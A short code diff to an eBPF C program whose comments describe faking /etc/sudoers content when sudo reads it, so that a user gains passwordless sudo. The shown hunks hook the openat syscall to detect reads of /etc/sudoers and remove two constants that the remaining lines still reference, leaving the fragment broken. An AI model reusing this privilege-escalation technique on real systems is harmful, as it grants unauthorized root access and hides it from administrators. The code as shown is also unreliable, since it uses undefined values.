@@ -40,7 +40,6 @@ const volatile int uid = 0;
 // add to /etc/sudoers when viewed by sudo
 // Which makes it think our user can sudo
 // without a password
-const int max_payload_len = 100;
 const volatile int payload_len = 0;
 const volatile char payload[max_payload_len];
 
@@ -71,7 +70,6 @@ int handle_openat_enter(struct trace_event_raw_sys_enter *ctx)
     }
 
     // Now check we're opening sudoers
-    const int sudoers_len = 13;
     const char *sudoers = "/etc/sudoers";
     char filename[sudoers_len];
     bpf_probe_read_user(&filename, sudoers_len, (char*)ctx->args[1]);
